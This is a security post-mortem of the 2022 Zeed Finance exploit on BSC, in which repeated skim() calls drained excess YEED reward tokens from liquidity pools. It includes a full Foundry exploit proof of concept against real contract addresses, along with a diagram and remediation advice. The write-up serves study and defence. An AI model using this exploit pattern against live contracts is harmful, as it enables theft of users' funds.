# Zeed Finance — Reward Token Theft via Repeated skim() Calls

| Field | Details |
|------|------|
| **Date** | 2022-04-21 |
| **Protocol** | Zeed Finance (YEED Token) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$1,000,000 (YEED, USDT) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 17,132,514 |
| **Vulnerable Contract** | USDT-YEED-HoSwap Pair [0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399](https://bscscan.com/address/0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399) |
| **Root Cause** | The automatic reward mechanism on YEED token transfers deposits additional YEED into the LP pool, allowing an attacker to repeatedly call `skim()` to drain the excess |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Zeed_exp.sol) |

---
## 1. Vulnerability Overview

The YEED token had a built-in mechanism that automatically distributed rewards to pools on every transfer. This mechanism operated by directly transferring a portion of tokens to LP pool addresses, which continuously caused the pool's actual YEED balance to exceed its reserves.

The attacker exploited this by:
1. Borrowing a large amount of YEED via flash loan
2. Calling `skim()` 10 times in a loop against three LP pools
3. Collecting the excess YEED from the pool on each call
4. Finally swapping YEED for USDT to realize profit

---
## 2. Vulnerable Code Analysis

```solidity
// YEED token's automatic reward mechanism (pseudocode)
contract YEEDToken {
    address[] public pools; // list of pools that receive rewards
    uint256 public rewardRate = 100; // 0.1% per transfer

    function transfer(address to, uint256 amount) external returns (bool) {
        // ❌ Automatically distributes reward tokens to pools on every transfer
        uint256 reward = amount * rewardRate / 100_000;
        for (uint i = 0; i < pools.length; i++) {
            // Directly send reward to pool
            _balances[pools[i]] += reward / pools.length;
        }
        // This causes pool's actual balance > reserve
        _balances[msg.sender] -= amount;
        _balances[to] += amount - reward;
        return true;
    }
}

// Attack: repeated skim() calls
// Uniswap V2 skim():
// function skim(address to) external {
//     uint excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;
//     uint excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;
//     if (excess0 > 0) token0.transfer(to, excess0);
//     if (excess1 > 0) token1.transfer(to, excess1);
// }
// ❌ After each skim, the transfer reward creates excess again → infinite loop possible

// ✅ Correct pattern
// Accumulate rewards in a separate reward contract instead of directly transferring to pool addresses
// Or force an automatic sync after skim to immediately update reserves
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**Zeed_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: The automatic reward mechanism on YEED token transfers deposits additional YEED into the LP pool, allowing an attacker to repeatedly call `skim()` to drain the excess
    function skim(address arg0) external {}  // 0xbc25cf77  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash swap: borrow large amount of YEED (USDT-YEED-HoSwap Pair)
    │
    ├─[2] [Inside callback] repeated skim loop (10 times)
    │       for i in range(10):
    │           │
    │           ├─ transfer YEED to USDT-YEED Pair
    │           │       ⚡ YEED transfer reward → additional YEED added to each pool
    │           │
    │           ├─ USDT-YEED Pair.skim(address(this))
    │           │       collect excess YEED
    │           │
    │           ├─ HO-YEED Pair.skim(address(this))
    │           │       collect excess YEED
    │           │
    │           └─ ZEED-YEED Pair.skim(address(this))
    │                   collect excess YEED
    │
    ├─[3] Accumulated YEED → swap to USDT
    │       swapExactTokensForTokens(YEED → USDT)
    │
    ├─[4] Repay flash swap
    │       fee = reserve * 997/1000 calculation
    │
    └─[5] Loss: ~$1,000,000 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory);
}

contract ContractTest is Test {
    IERC20 YEED = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router = IPancakeRouter(0x6CD71A07E72C514f5d511651F6808c6395353968);

    IPancakePair usdtYeedHoPair = IPancakePair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);
    IPancakePair usdtYeedPair   = IPancakePair(0xA7741d6b60A64b2AaE8b52186adeA77b1ca05054);
    IPancakePair hoYeedPair     = IPancakePair(0xbC70FA7aea50B5AD54Df1edD7Ed31601C350A91a);
    IPancakePair zeedYeedPair   = IPancakePair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);

    function setUp() public {
        vm.createSelectFork("bsc", 17_132_514);
    }

    function testExploit() public {
        // Borrow YEED via flash swap
        (uint112 reserve1,,) = usdtYeedHoPair.getReserves();
        usdtYeedHoPair.swap(0, uint256(reserve1) - 1, address(this), "0x");
        emit log_named_decimal_uint("[Profit] USDT", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // ⚡ Repeat skim 10 times: each YEED transfer reward → skim the excess
        for (uint256 i = 0; i < 10; i++) {
            // Transfer YEED to each pool (triggers reward mechanism)
            YEED.transfer(address(usdtYeedPair), YEED.balanceOf(address(this)) / 3);

            // Collect excess YEED from three pools
            usdtYeedPair.skim(address(this));
            hoYeedPair.skim(address(this));
            zeedYeedPair.skim(address(this));
        }

        // Swap accumulated YEED → USDT
        YEED.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(YEED); path[1] = address(USDT);
        router.swapExactTokensForTokens(
            YEED.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash swap
        (uint112 _reserve1,,) = usdtYeedHoPair.getReserves();
        uint256 repay = (uint256(_reserve1) * 1000 / 997) + 1;
        YEED.transfer(address(usdtYeedHoPair), repay);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Token reward mechanism + skim exploitation |
| **CWE** | CWE-840: Business Logic Errors |
| **OWASP DeFi** | Automatic reward transfer + AMM skim combination |
| **Attack Vector** | YEED transfer reward → pool excess → repeated skim |
| **Precondition** | YEED transfers directly distribute rewards to LP pool addresses |
| **Impact** | Full drain of excess YEED from each pool |

---
## 6. Remediation Recommendations

1. **Change reward distribution method**: Instead of directly transferring to pool addresses, accumulate rewards in a separate reward registry and use a claim-based approach.
2. **Restrict skim access**: Prevent general users from calling skim directly, or modify the skim logic to immediately execute a sync afterward.
3. **Transfer-and-Sync**: Call `sync()` immediately after reward transfers to update reserves, keeping the extractable excess via skim at zero.
4. **Audit tokenomics design**: Review in advance how automatic reward mechanisms interact with AMMs.

---
## 7. Lessons Learned

- **Risk of complex tokenomics**: Complex mechanisms such as automatic rewards, fees, and rebases on transfer, when combined with AMMs, create unexpected vulnerabilities.
- **The dual nature of skim**: While skim is intended to recover mistakenly sent tokens, when combined with a token that can deliberately create excess balances, it becomes an attack vector.
- **$1M loss**: A pattern that frequently occurs with small-cap tokens in the BSC ecosystem.